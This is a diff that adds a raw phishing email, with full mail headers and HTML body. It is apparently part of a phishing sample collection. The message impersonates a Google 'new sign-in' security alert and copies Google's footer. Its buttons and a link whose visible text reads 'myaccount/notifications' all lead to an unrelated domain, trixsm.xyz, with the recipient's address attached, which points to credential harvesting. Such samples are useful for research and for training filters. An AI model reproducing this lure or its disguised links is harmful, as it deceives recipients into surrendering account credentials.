@@ -1,0 +1,136 @@
+Return-Path: vantogn526513starrapd@ahjmqzyy.com
+Delivered-To: jose@monkey.org
+X-FDA: 83209727118.21.6C766A1
+Received: from mta1.ahjmqzyy.com (mta1.ahjmqzyy.com [198.46.211.249])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 7A09D60003
+	for <jose@monkey.org>; Tue, 11 Mar 2025 15:58:18 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=pass header.d=ahjmqzyy.com header.s=dkim header.b=wFqbVwqQ;
+	spf=pass (imf14.b.hostedemail.com: domain of
+ vantogn526513starrapd@ahjmqzyy.com designates 198.46.211.249 as permitted
+ sender) smtp.mailfrom=vantogn526513starrapd@ahjmqzyy.com;
+	dmarc=pass (policy=none) header.from=ahjmqzyy.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1741708698;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=uNtu4UuUI3dghNpCOcvYnNtbbv5as8/tuy9SFeGX5vE=;
+	b=rybD6eeysnIN9LQ3Eu7L8BSPQ1JmMPcGxzHUx3aYsB+runqSJrQmD5Xrz2G+Ys2qtcwyqt
+	Eexs3qHWm02hqM+Sm1JoXpVXgTCbdcKO9lTG8dx2tj3/+Pqaxz4bygqEszxisyCu4QxjLa
+	69FulhC686BHU2p9lhQfKEWX5ofI5/Q=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=pass header.d=ahjmqzyy.com header.s=dkim header.b=wFqbVwqQ;
+	spf=pass (imf14.b.hostedemail.com: domain of
+ vantogn526513starrapd@ahjmqzyy.com designates 198.46.211.249 as permitted
+ sender) smtp.mailfrom=vantogn526513starrapd@ahjmqzyy.com;
+	dmarc=pass (policy=none) header.from=ahjmqzyy.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1741708698; a=rsa-sha256;
+	cv=none;
+	b=hqzdYA0p1w9rlD9vcUnOzijDg3/k1g/0I6uTLNA9EjNmxMFiKWThf0ClLOojoaUbvt6r8O
+	m3t/cAZVtXyBbUWkzqm5dM4zwhOL1X8VPBjuRv4uxKn4JW5IED8COwj/J+4ipg8Vm8UopO
+	VfbXUMRi7htkxE9bSX2v0FovkrXka8s=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=ahjmqzyy.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=vantogn090858starrapd@ahjmqzyy.com;
+ bh=szhJuIrKjJqoINMdo3G0eLxMyUw=;
+ b=wFqbVwqQGhuUZLrN7CE/R76tHCK7VEFmPYlIdPiKrFJRR+/ViPyspgXJ5X3usFHhIzsNl2cOl9yS
+   B7S/z0TrjOwQmL3+/6n+/VLqxyBqZTizBEv/hfIGjqgIM7G6tMMG+C6y6mwUBxdZULPVZ3iQ6ix0
+   UsctFw4/37cmSG+tb+Guhuc6saa/19mkJxhnXuyrSqbh7PBckYGCG0vlli3FodCyxKm/QbLL1aKN
+   daBOM440lDbpEWoETVthdNnZ4D8R91Ytl6/ekWiN+qOz8pxbS6HwbK00LD6U7wS8GoMzUPG3Jd6v
+   0yfvI/aUEs2hufboniNTR+hvL0lChnPzfz4wFg==
+From: monkey.org <vantogn090858starrapd@ahjmqzyy.com>
+To: jose@monkey.org
+Subject: NOTICE: Security Alert!!
+Date: 11 Mar 2025 18:58:15 +0300
+Message-ID: <20250311185815.2D2226C00712EE84@ahjmqzyy.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 7A09D60003
+X-Rspamd-Server: rspam11
+X-Spam-Status: No, score=5.60
+X-Stat-Signature: s1rgmxy4fb88j8e8xdac9dd4wz6tk333
+X-Rspam-User: 
+X-HE-Tag: 1741708698-651817
+X-HE-Meta: 
+ U2FsdGVkX18n0V1hZe3ONjII/WGGGvL0Z66ruUMS3voARfaiA+/dSVTPwoAPgpNsa8+Tt9toK1+a3CZg6lDVW1hbg6Y80PL4IUoA3nb8XDj5rIL47rzru974nGtEO4F0s6UYJxg3YIZ2YTsTGEPAu/ETGWYzbHZ4OIOad9G/Pf8VkOw5/KWYmQTfeY34wcIAPrEFvN4qQmq8NXF3ETMciHBuy5n05UwDAOCv9Cd8rrJosvzQS7X3lPvt0gQPU0sAnol5T3r3bQAWDqP6KebRZJRut8H8c62IXgiM3S7LvRXjf4z3M+Wz3F+lz9gJsHJQavkj8/1EZZj7ylw4mq2Iyy8GY3tfxQfZPci9SI+LMhPvPPQ7veJ2HWAISPpI8efVw0TPV2J69Plyz/7niFfJFpPx0VAiqSJZq0iX7v+AUUs3+DZJdcpBK5AfezU54RFybApmXSWizqWcsSOjW/yk3W+Dcv24fgDWVYHUN39hs1fO9Cja0wVKZV9aA4wt4OlQ/3cX5h6TLzQ2oDBGOShFy2jF0zYHyhFY19AZCDWcmTvuaka6gQaqmnJUh7IV7dtEhezycl8JjBM37zbXp28Ec47eCvQxqKMZyRm+RaEg1sDfJFppzi7MnlCcgLjRSj4IKfe4Vv5DXytGOtNczn1m3fgE7iOiysieaHkCTuDudjs2gMuMVd6twELFDva61mglILmYXRq5cyK74SvTDBhqe2xgv0EM6TomT6oEPNd2AzmL7utdMPx18+anMVSmT12x7hXdiiLyCK2FZXDkgiEqmw97oIH2zCbECZ83RAMPa0+R42yw/pwX80yVEIZUngBhmWXsiK7T/zCvPXUbyfOURbxlO5f3GTr+wB+wG8nNNfRhfpfh/TTUPWlaZfDqP61YCNKaWsoKdX+WYFPsz5m76PId8tY3ct1klLxERcez8sjESSf+/MXQvraCLGjQDsHQEybXQ3Vl2BP6bOAnRalnGnCQNKO
+ TZDNXyJ4dU1fY9HSf6u2DcK8EIvQgDM8IPh71gVMVKDcLM3E3kzuFR/tUs/EVDfnHe5+72j5WsWEm4OlppRPK7dIbQ6tT7kev2ChJLlaKnmZ/lc1QyPQhjYy6UmgBd+Itz7mG7MJ4m01QjpQDmQXpKdYgTDgE6euYG7WuNyNcH/Oq5xTniTHkAPIjyP5UrIhl+7FQoL5qhnp+B7hN/9FOlob1i+CI0Tf67C0qL2VX9fk1z/yHqF2YKl3BciV+wPe1/tJHpJFF2v2WXtmrE/7rcX6kiaX643UEM9XwvS6nb9X/QMl1z8jYOGM1+RnEshbxqF2Kl38+Vnc7QM57hGKFCqVlpykTL5hmvMa9JT0XCBjHBD5Bf5bca55Qokvxt2ZD1wdDW6ZzkN/C5HejwO8Oasc/ZXKj7MjjSCk4IrfavcB/U2h07tSracdTCZeLNTDK4bhsco71KcEfggl5/E7E3DMQMPVO8dQdmELH/TAdmvHKbr92FnpHTV50buObPcyzfkEHeNwrqqq+BnpdRtuxsRbcZQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 92
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20820"></HEAD>
+<BODY>
+<TABLE lang=3Den style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MIN-WIDTH: 348px; TEXT-=
+TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: no=
+rmal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decor=
+ation-thickness: initial; text-decoration-style: initial; text-decoration-c=
+olor: initial" height=3D"100%" cellSpacing=3D0=20
+cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR align=3Dcenter>
+<TD style=3D"MARGIN: 0px"><BR class=3Dgmail-Apple-interchange-newline>
+<TABLE style=3D"MAX-WIDTH: 516px; MIN-WIDTH: 220px; PADDING-BOTTOM: 20px" c=
+ellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"WIDTH: 8px; MARGIN: 0px" width=3D8></TD>
+<TD style=3D"MARGIN: 0px">
+<DIV class=3Dm_7357376883637242358mdv2rw style=3D"BORDER-TOP: rgb(218,220,2=
+24) thin solid; BORDER-RIGHT: rgb(218,220,224) thin solid; BORDER-BOTTOM: r=
+gb(218,220,224) thin solid; PADDING-BOTTOM: 40px; PADDING-TOP: 40px; PADDIN=
+G-LEFT: 20px; BORDER-LEFT: rgb(218,220,224) thin solid; PADDING-RIGHT: 20px=
+; border-radius: 8px" align=3Dcenter>
+<DIV style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif; BORDER-BOTTOM: rgb(218,220,224) thin solid; COLOR: ; PADD=
+ING-BOTTOM: 24px; LINE-HEIGHT: 32px'>
+<DIV style=3D"FONT-SIZE: 24px">New connection from an unknown user</DIV>
+<TABLE style=3D"MARGIN-TOP: 8px" align=3Dcenter>
+<TBODY>
+<TR style=3D"LINE-HEIGHT: normal">
+<TD style=3D"MARGIN: 0px; PADDING-RIGHT: 8px" align=3Dright></TD>
+<TD style=3D"MARGIN: 0px">jose@monkey.org</TD></TR></TBODY></TABLE></DIV>
+<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
+l, sans-serif; COLOR: ; PADDING-TOP: 20px; LINE-HEIGHT: 20px">We've detecte=
+d a new sign-in attempt to your Account from an unknown user. If this was y=
+ou, click on 'Yes it's me, view activity' If this was not the case, click o=
+n 'Not me, secure account' we'll help you secure your account.
+<DIV style=3D"PADDING-TOP: 32px"><A style=3D'FONT-FAMILY: "Google Sans", Ro=
+boto, RobotoDraft, Helvetica, Arial, sans-serif; MIN-WIDTH: 90px; COLOR: rg=
+b(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px=
+; DISPLAY: inline-block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px; BACKGROUND=
+-COLOR: rgb(65,132,243); border-radius: 5px; text-decoration-line: none' hr=
+ef=3D"https://trixsm.xyz/nt/app/?client-request-id=3Djose@monkey.org" targe=
+t=3D_blank>Yes it's me, view activity</A></DIV>
+<DIV style=3D"PADDING-TOP: 32px"><A style=3D'FONT-FAMILY: "Google Sans", Ro=
+boto, RobotoDraft, Helvetica, Arial, sans-serif; MIN-WIDTH: 90px; COLOR: rg=
+b(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px=
+; DISPLAY: inline-block; LINE-HEIGHT: 16px; PADDING-RIGHT: 24px; BACKGROUND=
+-COLOR: rgb(65,132,243); border-radius: 5px; text-decoration-line: none' hr=
+ef=3D"https://trixsm.xyz/nt/app/?client-request-id=3Djose@monkey.org" targe=
+t=3D_blank>Not me, secure account</A></DIV></DIV>
+<DIV style=3D"FONT-SIZE: 12px; COLOR: rgb(95,99,104); PADDING-TOP: 20px; LE=
+TTER-SPACING: 0px; LINE-HEIGHT: 16px">You can also view your account securi=
+ty activity here:<BR><A style=3D"COLOR: rgb(17,85,204)" href=3D"https://tri=
+xsm.xyz/nt/app/?client-request-id=3Djose@monkey.org">https://myaccount/noti=
+fications</A></DIV></DIV>
+<DIV>
+<DIV style=3D"FONT-SIZE: 11px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
+l, sans-serif; COLOR: ; TEXT-ALIGN: center; PADDING-TOP: 12px; LINE-HEIGHT:=
+ 18px">
+<DIV>You received this email to let you know about important changes to you=
+r&nbsp;<SPAN class=3Dgmail-il>Google</SPAN>&nbsp;Account and services.</DIV=
+>
+<DIV style=3D"DIRECTION: ltr">&copy; 2025&nbsp;<SPAN class=3Dgmail-il>Googl=
+e</SPAN>&nbsp;LLC,&nbsp;1600 Amphitheatre Parkway, Mountain View, CA 94043,=
+ USA</DIV></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><=
+/BODY></HTML>
+
